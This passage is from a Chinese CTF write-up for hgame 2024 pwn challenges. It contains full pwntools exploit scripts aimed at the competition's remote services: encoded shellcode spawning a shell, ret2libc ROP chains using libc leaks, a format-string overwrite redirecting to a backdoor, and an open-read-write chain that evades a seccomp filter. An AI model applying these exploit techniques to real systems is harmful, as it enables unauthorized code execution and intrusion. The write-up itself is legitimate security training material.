b=Image.open(f&#x27;png_out/&#123;i&#125;&#x27;,&#x27;r&#x27;) c=xor_images(a,b) black_pixels_num=count_black_pixels(c) images_dict[ind]=&#123;&#x27;image&#x27;:copy.copy(c),&#x27;black_pixels_num&#x27;:black_pixels_num,&#x27;filename&#x27;:i&#125; os.mkdir(j) for i in images_dict.values(): image=i[&#x27;image&#x27;] image.save(f&quot;&#123;j&#125;/xor_&#123;i[&#x27;filename&#x27;]&#125;.png&quot;) #print(content)#hgame&#123;1adf_17eb_803c&#125; Pwnezshellcode myread限制了shellcode必须为字母数字 https://www.cnblogs.com/hetianlab/p/17647861.htmlhttps://www.cnblogs.com/hetianlab/p/17647861.html amd64的 https://github.com/veritas501/ae64https://github.com/veritas501/ae64 报错解决 https://github.com/keystone-engine/keystone/issues/386https://github.com/keystone-engine/keystone/issues/386 x64的 https://github.com/rcx/shellcode_encoderhttps://github.com/rcx/shellcode_encoder 1234567891011from pwn import *from ae64 import AE64p=remote(&#x27;47.100.137.175&#x27;,30959)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)obj=AE64()shellcode=obj.encode(asm(shellcraft.sh()),&#x27;rax&#x27;)print(shellcode)p.sendlineafter(b&#x27;input the length of your shellcode:&#x27;,b&#x27;-1&#x27;)p.sendafter(b&#x27;input your shellcode:&#x27;,shellcode)p.interactive() Elden Random Challengepwn随机数模版题目+libc泄漏基址 猜对了会给一个栈溢出的点 https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/ ctypes包的cdll.LoadLibrary(‘http://libc.so.xxxhttp://libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。 12345678910111213from pwn import *from ctypes import *libc = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)p = remote(&#x27;47.100.137.175&#x27;,31178)libc.srand(c_uint(libc.time(0)))p.sendlineafter(b&#x27;Menlina: Well tarnished, tell me thy name.&#x27;,b&#x27;jok&#x27;)for i in range(99): r=libc.rand()%100+1 print(r) p.sendafter(b&#x27;Please guess the number:&#x27;,p64(r))p.interactive() 123456789101112131415161718192021222324252627282930from pwn import *from ctypes import *libc = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)p = remote(&#x27;47.100.137.175&#x27;,31058)libc.srand(c_uint(libc.time(0)))p.sendlineafter(b&#x27;Menlina: Well tarnished, tell me thy name.&#x27;,b&#x27;jok&#x27;)for i in range(99): r=libc.rand()%100+1 print(r) p.sendafter(b&#x27;Please guess the number:&#x27;,p64(r))pop_rdi_addr=0x401423puts_got_addr=0x404018puts_plt_addr=0x4010b0myread_addr=0x40125dret_addr=0x40101aputs_offset=0x084420sys_offset=0x052290sh_offset=0x1b45bd#泄漏payload= b&#x27;A&#x27;*0x38+p64(ret_addr)+ p64(pop_rdi_addr)+p64(puts_got_addr) + p64(puts_plt_addr) + p64(myread_addr)p.sendlineafter(b&#x27;reward to thy brilliant mind&#x27;,payload)p.recvline()libc_base_addr=u64(p.recvline()[:-1].ljust(8,b&#x27;\\x00&#x27;))-puts_offsetprint(hex(libc_base_addr))#getshellpayload=b&#x27;A&#x27;*0x38+p64(ret_addr)+p64(pop_rdi_addr)+p64(sh_offset+libc_base_addr)+p64(sys_offset+libc_base_addr)p.sendline(payload)p.interactive() ezfmt string 限制了格式化字符串的输入 而且给了后门了 %d 有符号32位整数 %u 无符号32位整数 &#x20; %lld 有符号64位整数 %llx有符号64位16进制整数 只有一次的格式化字符串的机会 https://www.codercto.com/a/85297.htmlhttps://www.codercto.com/a/85297.html 提到了一种使用格式化字符串漏洞使程序无限循环的操作 程序退出会调用finiarray 查看_fini_array 直接覆盖为后门函数就行 但是这题似乎不行 直接抽奖然后栈迁移，控制rbp上来 概率还可以，1/16 123456789from pwn import *backdoor_addr=0x40123dwhile True: sleep(0.5) p = remote(&#x27;47.102.130.35&#x27;, 31292) payload=f&#x27;%&#123;0x08&#125;c%18$hhnAAAAAA&#x27;.encode()+p64(backdoor_addr) p.sendlineafter(b&#x27;make strings and getshell&#x27;,payload) p.interactive() p.close() Elden Ring Ⅰ 可以使用seccomp-tools来检查 https://www.cnblogs.com/robinbin/p/16172041.htmlhttps://www.cnblogs.com/robinbin/p/16172041.html 这个文件链接库有点问题，patch一下 12patchelf --set-interpreter ~/Pwn/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so vuln 12seccomp-tools dump ./vuln execve和execveat都不能用 https://forum.butian.net/share/544https://forum.butian.net/share/544 1rdi,rsi,rdx 泄露出libc基地址后,使用libc中的gadget控制参数 使用ret2csu 在__libc_csu_init函数中有两段可以利用的代码段 具体利用看链接 https://forum.butian.net/share/544https://forum.butian.net/share/544 这里ret2csu不好打，就直接orw 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *p=remote(&#x27;47.100.245.185&#x27;,32384)libc=ELF(&#x27;./libc.so.6&#x27;)puts_got_addr=0x404028puts_plt_addr=0x4010c0pop_rdi_addr=0x4013e3ret_addr=0x40101apush_rsp_offset=0x0422bdputs_offset=libc.sym[&#x27;puts&#x27;]open_offset=libc.sym[&#x27;open&#x27;]read_offset=libc.sym[&#x27;read&#x27;]write_offset=libc.sym[&#x27;write&#x27;]pop_rsi_offset=0x02601fpop_rdx_offset=0x142c92vuln_addr=0x40125bdef expandLeak(payload): #利用read扩大溢出 global pop_rdx_offset,libc_base,ret_addr,read_offset,vuln_addr prePayload = b&#x27;a&#x27; * 0x108 + p64(pop_rdx_offset + libc_base) + p64(0x1fff) + p64(ret_addr) + p64(read_offset + libc_base) p.sendlineafter(b&#x27;I offer you an accord. &#x27;, prePayload) p.sendline(b&#x27;a&#x27;*0x108 + b&#x27;a&#x27;*8*4+payload)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#泄漏libcpayload=b&#x27;a&#x27;*0x108+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr)p.sendlineafter(b&#x27;I offer you an accord. &#x27;,payload)p.recvline()libc_base= u64(p.recvline()[:-1].ljust(8, b&#x27;\\x00&#x27;)) - puts_offset#泄露栈地址payload=p64(pop_rdi_addr) + p64(1) + p64(pop_rdx_offset+libc_base) + p64(0x198) + p64(write_offset+libc_base)+p64(vuln_addr)expandLeak(payload)p.recvline()p.recvn(0x190)stack_base=u64(p.recvn(8))-0x1a8print(hex(stack_base))#布置openpayload=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(0x300)+p64(write_offset+libc_base)+p64(vuln_addr)expandLeak(payload)payload=p64(pop_rdi_addr)+p64(stack_base+0x1d0)+p64(pop_rsi_offset+libc_base)+p64(0)+p64(pop_rdx_offset+libc_base)+p64(0)+p64(ret_addr)+p64(open_offset+libc_base)#用来确定字符串偏移payload=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base+0x1d0)+p64(pop_rdx_offset+libc_base)+p64(0x300)+p64(ret_addr)+p64(write_offset+libc_base)payload+=p64(vuln_addr)payload+=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;expandLeak(payload)#read&amp;writepayload=p64(pop_rdi_addr)+p64(3)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(60)+p64(read_offset+libc_base)payload+=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(60)+p64(write_offset+libc_base)payload+=p64(vuln_addr)expandLeak(payload)#getflagprint(p.recvall(timeout=2))p.interactive()","tags":["ctf","2024","hgame"],"categories":["Writeups"]}]